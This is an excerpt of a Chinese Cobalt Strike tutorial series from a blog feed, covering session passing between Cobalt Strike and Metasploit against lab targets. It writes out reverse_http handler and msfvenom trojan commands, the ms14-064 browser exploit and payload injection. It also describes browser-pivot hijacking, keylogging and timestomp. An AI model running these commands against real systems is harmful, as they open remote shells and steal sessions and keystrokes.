src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/9.png"></p><p>3.新建一个监听器，用于将会话派生到新开启的teamserver上。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/10.png"></p><p>4.选择将要派生到teamserver的会话，通过spawn模块派生即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/11.png"></p><p>5.在新开启的teamserver上查看会话成功派生。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/12.png"></p><h5 id="4-1-2-3-CS派生MSF会话"><a href="#4-1-2-3-CS派生MSF会话" class="headerlink" title="4.1.2.3 CS派生MSF会话"></a>4.1.2.3 CS派生MSF会话</h5><p>1.在 Kail上开启metasploit框架，并开启监听。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler </span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 10.251.0.33</span><br><span class="line">set lport 7777</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/13.png"></p><p>2.在Cobalt Strike上创建一个监听器。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/14.png"></p><p>3.通过Spawn将会话派生到新创建的监听器中。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/15.png"></p><p>4.在msf服务器上查看会话已经成功派生。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/16.png"></p><h5 id="4-1-2-4-MSF-生成木马与CS会话"><a href="#4-1-2-4-MSF-生成木马与CS会话" class="headerlink" title="4.1.2.4 MSF 生成木马与CS会话"></a>4.1.2.4 MSF 生成木马与CS会话</h5><p>1.通过 msfvenom 生成木马文件。其中LHOST和LPORT要设置为teamserver的IP与端口。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_http LHOST=10.251.0.35 LPORT=9999 -f exe &gt; /tmp/msf.exe</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/17.png"></p><p>2.在Cobalt Strike上创建一个监听器。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/18.png"></p><p>3.将木马文件上传到目标靶机，并执行。目标成功在Cobalt Strike上线。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/19.png"></p><h5 id="4-1-2-5-MSF使用溢出exp与CS会话"><a href="#4-1-2-5-MSF使用溢出exp与CS会话" class="headerlink" title="4.1.2.5 MSF使用溢出exp与CS会话"></a>4.1.2.5 MSF使用溢出exp与CS会话</h5><p>使用ms14-064漏洞进行测试。</p><p>这里简单介绍一下ms14-064漏洞：</p><p>Microsoft Windows OLE远程代码执行漏洞，OLE（对象链接与嵌入）是一种允许应用程序共享数据和功能的技术，远程攻击者利用此漏洞通过构造的网站执行任意代码，影响Win95+IE3 –Win10+IE11全版本。</p><p>具体利用流程如下：</p><p>1.在msf服务器上搜索ms14-064模块。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/20.png"></p><p>2、使用对应模块，并设置参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/ms14_064_ole_code_execution</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br></pre></td></tr></table></figure><p>参数设置如下，svrhost、svrport设置为MSF的IP和端口，payload的lhost、lport设置为CS监听器的IP和端口。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/21.png"></p><p>这里要简单说明几个参数的作用：</p><p>1.set Disablepayloadhandler true：这告诉metasploit框架，它不需要在metasploit框架内创建处理程序来服务有效负载连接。</p><p>2.set PrependMigrate true：告诉metasploit框架修改其stager，以便在利用之后立即迁移到另一个进程，此选项对于客户端攻击非常重要。它允许您的会话在被利用的应用程序崩溃或关闭时存活。</p><p>通过exploit执行完，会生成一行钓鱼链接：</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/23.png"></p><p>3.在 Cobalt Strike 上设置监听器。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/22.png"></p><p>监听器设置的payload，hosts和port均要与msf上所设置的一致。</p><p>4.在目标靶机上的IE浏览器中执行MSF的钓鱼链接。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/25.png"></p><h5 id="4-1-2-6-MSF派生CS会话"><a href="#4-1-2-6-MSF派生CS会话" class="headerlink" title="4.1.2.6 MSF派生CS会话"></a>4.1.2.6 MSF派生CS会话</h5><p>通过ms14-064漏洞进行演示。</p><p>1.通过ms14-064漏洞获取目标主机的meterpreter会话。</p><p>步骤与上述的基本一致，只需要修改Lhost、Lport为MSF服务的IP和端口，以及disablepayloadhandler 的值为false即可，参数设置如下。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/26.png"></p><p>通过exploit执行获得链接</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/27.png"></p><p>并在目标靶机上执行即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/28.png"></p><p>这时候可以看到成功获取到meterpreter会话了。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/29.png"></p><p>2.将会话派生到 Cobalt Strike上。</p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/payload_inject </span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set session 1</span><br></pre></td></tr></table></figure><p>设置对应的参数。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/30.png"></p><p>3.在Cobalt Strike 上创建监听器。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/31.png"></p><p>4.执行msf的模块</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/32.png"></p><p>5.在Cobalt Strike上可以看到会话成功派生。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/33.png"></p><h3 id="4-2-Explore"><a href="#4-2-Explore" class="headerlink" title="4.2 Explore"></a>4.2 Explore</h3><p>用户驱动攻击简单来说就是控制端通过远程控制让受控端来执行某一些操作。 常见的用户驱动攻击的模块如下：屏幕截图、键盘记录、进程处理、端口扫描、用户发现、文件管理、远程vnc、浏览器代理(仅针对ie浏览器)等，如下图所示。</p><p>![](D:/a_sangfor_outside_work/高级威胁组/学习资料/Cobalt Strike/1-Cobalt Strike基础/picture/23.png)</p><h4 id="4-2-1-浏览器代理"><a href="#4-2-1-浏览器代理" class="headerlink" title="4.2.1 浏览器代理"></a>4.2.1 浏览器代理</h4><p>浏览器转发是指在已经攻击成功的目标中，利用目标的信息登录网站进行会话劫持，但是目前只支持目标正在使用IE浏览器的前提下。关于如何判断当前用户是否使用IE浏览器，则可以通过屏幕截图来判断。如下图中，通过屏幕截图可以看到目标正在使用IE浏览器登陆着当前网站。</p><p>具体使用步骤如下：</p><p>1.选择 Browser Privot 代理。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/34.png"></p><p>2.选择对应的进程。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/35.png"></p><p>这里我们要将Proxy Serve Port 的值记录下来。</p><p>在命令行可以看到浏览器代理已经成功开启。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/36.png"></p><p>3.为CS上的服务器的浏览器设置代理。代理服务器的IP地址为teamserver的IP地址，代理端口为刚刚记录下的Proxy Serve Port 的值。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/37.png"></p><p>如果目标用户曾经通过IE浏览器登录某网站后台，并保存登录信息。这时候我们只需要通过访问目标后台地址即可实现免密登录。</p><p>5.通过browserpivot stop 关闭浏览器代理。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/38.png"></p><h4 id="4-2-2-远程VNC"><a href="#4-2-2-远程VNC" class="headerlink" title="4.2.2 远程VNC"></a>4.2.2 远程VNC</h4><p>该模块可以对目标用户进行远程控制，具体使用步骤如下。</p><p>选择VNC模块进行利用。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/39.png"></p><p>运行结果如下：</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/40.png"></p><h4 id="4-2-3-文件管理"><a href="#4-2-3-文件管理" class="headerlink" title="4.2.3 文件管理"></a>4.2.3 文件管理</h4><p>浏览会话系统文件位置在右击会话处，选择 Explore –&gt; File Browser即可打开。在这里可以对当前会话下的文件进行浏览、上传、下载、删除等操作。</p><p>在进行文件浏览时，如果 beacon 设置的 sleep 值较高，CS会因此而变得响应比较慢。</p><p>彩色文件夹表示该文件夹的内容位于此文件浏览器的缓存中；深灰色的文件夹表示该文件夹的内容不在此文件浏览器缓存中。</p><p><strong>文件下载</strong></p><p>download：下载请求的文件。Beacon 会下载它的任务要求获取的每一个文件的固定大小的块。这个块的大小取决于 Beacon 当前的数据通道。HTTP 和 HTTPS 通道会拉取 512kb 的数据块。</p><p>downloads：查看当前 Beacon 正在进行的文件下载列表。</p><p>cancel：该命令加上一个文件名来取消正在进行的一个下载任务。也可以在 cancel 命令中使用通配符来一次取消多个文件下载任务。</p><p>下载文件都将下载到CS团队服务器中，在View –&gt; Download下可看到下载文件的记录，选中文件后使用Sync Files即可将文件下载到本地。</p><p><strong>文件上传</strong></p><p>upload：上传一个文件到目标主机上。</p><p>timestomp：将一个文件的修改属性访问属性和创建时间数据与另一个文件相匹配。当上传一个文件时，有时会想改变此文件的时间戳来使其混入同一文件夹下的其他文件中，使用timestomp 命令就可以完成此工作。</p><p>选择File Browser模块进行利用。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/41.png"></p><p>结果如下：</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/42.png"></p><h4 id="4-2-4-Net-View"><a href="#4-2-4-Net-View" class="headerlink" title="4.2.4 Net View"></a>4.2.4 Net View</h4><p>该模块用于显示域列表、计算机列表或指定计算机的共享资源列表，具体使用步骤如下。</p><p>选择对应的Net View模块利用即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/43.png"></p><p>运行结果如下：</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/44.png"></p><h4 id="4-2-5-端口扫描"><a href="#4-2-5-端口扫描" class="headerlink" title="4.2.5 端口扫描"></a>4.2.5 端口扫描</h4><p>该模块用于探针目标主机所在网段内主机端口开放情况，使用步骤如下。</p><p>1.选择对应的 Port Scan 模块进行利用。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/45.png"></p><p>2.选择需要探针的网段、端口范围、最大连接数以及使用的协议类型。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/46.png"></p><p>3.查看命令行，发现扫描已经开始运行。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/47.png"></p><p>4.在View视图内的Targets可以查看扫描结果。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/48.png"></p><h4 id="4-2-6-进程列表"><a href="#4-2-6-进程列表" class="headerlink" title="4.2.6 进程列表"></a>4.2.6 进程列表</h4><p>该模块用于查看目标的进程，使用该模块可以对目标主机进行进程注入、屏幕截图，键盘记录、删除进程等操作，使用步骤如下。</p><p>1.右键选择Explore下的Process List模块。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/49.png"></p><p>2.控制台输出区可以查看进程列表。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/53.png"></p><p>3.选择explore.exe进程，点击Screenshot进行屏幕截取。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/50.png"></p><p>运行结果可以在view视图的Screenshots中查看。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/52.png"></p><h4 id="4-2-7-屏幕截取"><a href="#4-2-7-屏幕截取" class="headerlink" title="4.2.7 屏幕截取"></a>4.2.7 屏幕截取</h4><p>该模块用于对目标屏幕进行截取，该模块运行的结果与上述在进程列表中通过Screenshot进行截图的结果基本一致，具体使用步骤如下。</p><p>右键选择Explore下的Screenshot模块进行利用即可。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/51.png"></p><h4 id="4-2-8-键盘记录"><a href="#4-2-8-键盘记录" class="headerlink" title="4.2.8 键盘记录"></a>4.2.8 键盘记录</h4><p>右键选择Explore下的Process List模块。点击Log Keystrokes进行键盘记录，运行结果可以在view视图的Keystrokes中查看。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%AD%E7%AF%87/54.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://teamssix.com/year/201023-192553.html">https://teamssix.com/year/201023-192553.html</a></li><li><a href="https://xz.aliyun.com/t/3975">https://xz.aliyun.com/t/3975</a></li><li><a href="https://payloads.online/tools/socat">https://payloads.online/tools/socat</a></li><li><a href="https://zhuanlan.zhihu.com/p/93718885">https://zhuanlan.zhihu.com/p/93718885</a></li><li><a href="https://www.anquanke.com/post/id/156299">https://www.anquanke.com/post/id/156299</a></li><li><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></li><li><a href="https://www.freebuf.com/sectool/173366.html">https://www.freebuf.com/sectool/173366.html</a></li><li><a href="https://my.oschina.net/u/4300698/blog/3382230">https://my.oschina.net/u/4300698/blog/3382230</a></li><li><a href="https://segmentfault.com/a/1190000019290085">https://segmentfault.com/a/1190000019290085</a></li><li><a href="https://www.cnblogs.com/cthon/p/9151467.html">https://www.cnblogs.com/cthon/p/9151467.html</a></li><li><a href="https://www.secpulse.com/archives/127186.html">https://www.secpulse.com/archives/127186.html</a></li><li><a href="https://www.freebuf.com/articles/web/231892.html">https://www.freebuf.com/articles/web/231892.html</a></li><li><a href="https://klionsec.github.io/2017/09/23/cobalt-strike/">https://klionsec.github.io/2017/09/23/cobalt-strike/</a></li><li><a href="https://www.renfei.org/blog/introduction-to-spf.html">https://www.renfei.org/blog/introduction-to-spf.html</a></li><li><a href="https://www.cnblogs.com/backlion/p/10616308.html">https://www.cnblogs.com/backlion/p/10616308.html</a></li><li><a href="https://blog.csdn.net/hnjztyx/article/details/52910478">https://blog.csdn.net/hnjztyx/article/details/52910478</a></li><li><a href="http://blog.leanote.com/post/snowming/62ec1132a2c9">http://blog.leanote.com/post/snowming/62ec1132a2c9</a></li><li><a href="https://blog.csdn.net/pipisorry/article/details/52269785">https://blog.csdn.net/pipisorry/article/details/52269785</a></li><li><a href="https://blog.csdn.net/l1028386804/article/details/86675559">https://blog.csdn.net/l1028386804/article/details/86675559</a></li><li><a href="https://www.freebuf.com/company-information/167460.html">https://www.freebuf.com/company-information/167460.html</a></li><li><a href="https://blog.csdn.net/qq_34101364/article/details/108062913">https://blog.csdn.net/qq_34101364/article/details/108062913</a></li><li><a href="https://blog.csdn.net/github_35186068/article/details/80518681">https://blog.csdn.net/github_35186068/article/details/80518681</a></li><li><a href="https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/">https://pythonpig.github.io/2018/01/17/Cobaltstrike-SMB-beacon/</a></li><li><a href="https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/">https://www.varonis.com/blog/kerberos-how-to-stop-golden-tickets/</a></li><li><a href="https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/">https://lunamoore.github.io/2020/08/18/veil-evasion%E5%AE%89%E8%A3%85/</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;by Tahir 2021.6.8&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;接着基础上篇&lt;/p&gt;
&lt;h2 id=&quot;4-后渗透&quot;&gt;&lt;a href=&quot;#4-后渗透&quot; class=&quot;headerlink&quot; title=&quot;4.后渗透&quot;&gt;&lt;/a&gt;4.</summary>
      
    
    
    
    <category term="威胁猎捕" scheme="http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/"/>
    
    <category term="Cobalt Strike" scheme="http://example.com/categories/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt-Strike/"/>
    
    
    <category term="Cobalt Strike" scheme="http://example.com/tags/Cobalt-Strike/"/>
    
  </entry>
  
  <entry>
    <title>1-Cobalt Strike基础上篇</title>
    <link href="http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/"/>
    <id>http://example.com/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/</id>
    <published>2021-07-03T03:35:03.000Z</published>
    <updated>2021-07-03T03:42:22.369Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p><strong>by Tahir 2021.6.8</strong></p><h2 id="1-Cobalt-Strike-模块详解"><a href="#1-Cobalt-Strike-模块详解" class="headerlink" title="1.Cobalt Strike 模块详解"></a>1.Cobalt Strike 模块详解</h2><h3 id="1-1-Cobalt-Strike-模块"><a href="#1-1-Cobalt-Strike-模块" class="headerlink" title="1.1 Cobalt Strike 模块"></a>1.1 Cobalt Strike 模块</h3><p>Cobalt Strike 模块的功能选项，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/1.png"></p><ul><li>New Connection：打开一个新的”Connect”窗口。在当前窗口中新建一个连接，即可同时连接不同的团队服务器( 便于团队之间的协作)。</li><li>Preferences：偏好设置，首选项，用于设置Cobalt Strike主界面、控制台、TeamServer 连接记录、报告的样式。</li><li>Visualization：将主机以不同的权限展示出来（主要以输出结果的形式展示）。</li><li>VPN Interfaces：设置VPN接口。</li><li>Listeners：创建监听器。</li><li>Script Manager：查看和加载CNA脚本。</li><li>Close：关闭当前与TeamServer的连接。</li></ul><h3 id="1-2-View-模块"><a href="#1-2-View-模块" class="headerlink" title="1.2 View 模块"></a>1.2 View 模块</h3><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/2.png"></p><ul><li>Applications：显示被控机器的应用信息。</li><li>Credentials：通过HashDump或mimikatz获取的密码或者散列值都储存在这里。</li><li>Downloads：从被控机器中下载的文件。</li><li>Event Log：主机上线记录，以及与团队协作相关的聊天记录和操作记录。</li><li>Keystrokes：键盘记录。</li><li>Proxy Pivots：代理模块。</li><li>Screenshots：屏幕截图模块。</li><li>Script Console：控制台，在这里可以加载各种脚本。（链接）</li><li>Targets：显示目标。</li><li>Web Log：Web 访问日志。</li></ul><h3 id="1-3-Attacks-模块"><a href="#1-3-Attacks-模块" class="headerlink" title="1.3 Attacks 模块"></a>1.3 Attacks 模块</h3><p>下面介绍Attacks模块下的Packages 和 Web Drive-by 模块。</p><p><strong>1.Packages模块</strong></p><p>依次单击 “Attacks” → “Packages” 选项，可以看到一系列功能模块，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/3.png"></p><ul><li>HTML Application：基于HTML应用的Payload模块，通过HTML调用其他语言的应用组件进行攻击测试，提供了可执行文件、PowerShell、 VBA三种方法。</li><li>MS Office Macro：生成基于Office病毒的Payload 模块。</li><li>Payload Generator：Payload 生成器，可以生成基于C、C#、COM Scriptlet、 Java、 Perl、 PowerShell、Python、 Ruby、 VBA等的Payload。</li><li>USB/CD AutoPlay：用于生成利用自动播放功能运行的后门文件。</li><li>Windows Dropper：捆绑器，能够对文档进行捆绑并执行Payload。</li><li>Windows Executable：可以生成32位或64位的EXE和基于服务的EXE、DLL等后门程序。在32位的Windows操作系统中无法执行64位的Payload, 而且对于后渗透测试的相关模块，使用32位和64位的Payload会产生不同的影响，因此在使用时应谨慎选择。</li><li>Windows Executable (S)：用于生成一个Windows 可执行文件，其中包含Beacon的完整Payload,不需要阶段性的请求。与Windows Executable模块相比，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持PowerShell脚本，可用于将Stageless Payload注入内存。</li></ul><p><strong>2.Web Drive-by 模块</strong></p><p>依次单击 “Attacks” → “Web Drive-by” 选项，可以看到一系列基于网络驱动的功能模块，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/4.png"></p><ul><li>Manage：管理器，用于对TeamServer上已经开启的Web服务进行管理，包括 Listener 及 Web Delivery模块。</li><li>Clone Site：用于克隆指定网站的样式。</li><li>Host File：用于将指定文件加载到Web目录中，支持修改Mime Type。</li><li>Script Web Delivery：基于Web的攻击测试脚本，自动生成可执行的Payload。</li><li>Signed Applet Attack：使用Java自签名的程序进行钓鱼攻击测试。如果用户有Applet 运行权限，就会执行其中的恶意代码。</li><li>Smart Applet Attack：自动检测Java的版本并进行跨平台和跨浏览器的攻击测试。该模块使用嵌入式漏洞来禁用Java的安全沙盒。可利用此漏洞的Java版本为1.6.0_45以下及1.7.0 _21以下。</li><li>System Profiler：客户端检测工具，可以用来获取一些系统信息，例如系统版本、浏览器版本、Flash版本等。</li></ul><h3 id="1-4-Reporting模块"><a href="#1-4-Reporting模块" class="headerlink" title="1.4 Reporting模块"></a>1.4 Reporting模块</h3><p>Reporting模块可以配合Cobalt Strike的操作记录、结果等，直接生成相关报告，如下图。</p><p><img src="/wiki/%E5%A8%81%E8%83%81%E7%8C%8E%E6%8D%95/Cobalt%20Strike/1-Cobalt-Strike%E5%9F%BA%E7%A1%80%E4%B8%8A%E7%AF%87/5.png"></p><ul><li>Activity report：活动报告生成。</li><li>Hosts report：主机报告。</li><li>Indicators of Compromise：目标报告。</li><li>Sessions Report：会话报告。</li><li>Social Engineering Peport：社会工程学报告。</li><li>Tactics, Techniques, and Procedures：战术技术过程，TTPs。</li><li>Reset Data：重置数据。</li><li>Export data：数据出口。</li></ul><h2 id="2-基础设施"><a href="#2-基础设施" class="headerlink" title="2.基础设施"></a>2.基础设施</h2><p>任何行动的第一步都是建立基础设施。就 Cobalt Strike 而言，基础设施由一个或多个团队服务器、重定向器以及指向你的团队服务器和重定向器的 DNS 记录组成。一旦团队服务器启动并运行，你将需要连接到它并将其配置为接收来自受害系统的连接。监听器就是 Cobalt Strike 中用来执行这种任务的机制。</p><h3 id="2-1-监听器管理"><a href="#2-1-监听器管理" class="headerlink" title="2.1 监听器管理"></a>2.1 